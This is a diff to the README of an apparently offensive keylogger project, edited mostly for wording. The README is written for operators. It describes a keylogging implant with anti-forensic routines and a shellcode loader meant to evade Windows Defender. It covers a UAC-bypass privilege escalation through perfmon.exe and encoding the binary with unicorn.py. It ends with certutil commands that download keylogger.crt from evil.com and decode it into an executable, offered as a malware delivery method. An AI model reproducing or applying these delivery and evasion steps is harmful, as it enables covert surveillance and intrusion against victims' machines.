@@ -49,7 +49,7 @@ The directory structure is as follows.
         └── shell.vbs
 
 ```
-
+### About
 
 `archivist.py` Is the main keylogging implant.
 `console.py` Will be Archivists handler, facilitating comms between the implant
@@ -58,8 +58,8 @@ and operator.
 These files are in active development.
 
 The `binary_to_hex.py` file is here because it will potentially be incorperated into the way the
-keylogger is going to be deployed. If you go to `exploits/AV-Evasion` in this repo there will be a C
-file there the contents of which look a little like below.
+keylogger is going to be deployed. If you go to the `exploits/AV-Evasion` directory in this repo there will be a C
+file there the contents of which look a little like those  below.
 
 ```
 #include <Windows.h>
@@ -89,7 +89,7 @@ int main() {
 }
 ```
 
-The implant is represented by the shell code you can see above. This 
+The payload is represented by the shell code you can see above. This 
 shell code can be replaced by custom shell code. Which is what we are going to 
 do. 
 
@@ -99,15 +99,15 @@ script to get a representation of the binary data in hex/shell code. Running
 our custom shell code we will end up with an executable that will attempt to 
 make it harder for Windows Defender to get in the way of our keylogging operations.
 
-Of course the keylogger itself has some anti-forensic and AV evasive routines
+Of course the keylogger itself has some anti-forensic and AV evasion routines
 itself but a little more might be helpful.
 
 
-Also in `exploits` directory can be found a C++ file and some related project files.
-this is a privilege escalation exploit originally developed by Martin Fischer of Bytecode77.
-Whom you can fin on github by clicking [here](https://github.com/bytecode77) and
-online over at his [website](https://bytecode77.com). I suggest checking both out
-he's got some amazing projects.
+Also in the `exploits` directory can be found a C++ file and some related project files.
+This is a privilege escalation exploit originally developed by Martin Fischer of Bytecode77.
+Whom you can find on github by clicking [here](https://github.com/bytecode77) and
+online over at his [website](https://bytecode77.com). (I suggest checking both out
+he's got some really cool projects there.)
 
 The exploit makes it so our binary keylogger file gets auto-elevated through Volatile Environment and
 perfmon.exe. 
@@ -119,13 +119,13 @@ from [TrustedSec](https://trustedsec.com) has the ability to encode a binary as 
 
 `python unicorn.py <path_to_payload/exe_encode> crt`
 
-The beauty of this is that the `certutil` on Windows can be used to both download and
-restore such files back to `exe`. If you're able to run:
+The beauty of this is that the `certutil` tool on Windows can be used to both download and
+restore the encoded files back to `exe`. If you're able to run:
 
 ```
 certutil -urlcache -split -f http://evil.com/keylogger.crt keylogger.crt
 certutil -decode keylogger.crt keylogger.exe
 ```
 
-Through remote code injection, or what have you. That would be a pretty effective way of delivering
+Through remote code injection, or your preferred vector. That would be a pretty effective way of delivering
 the malware.   
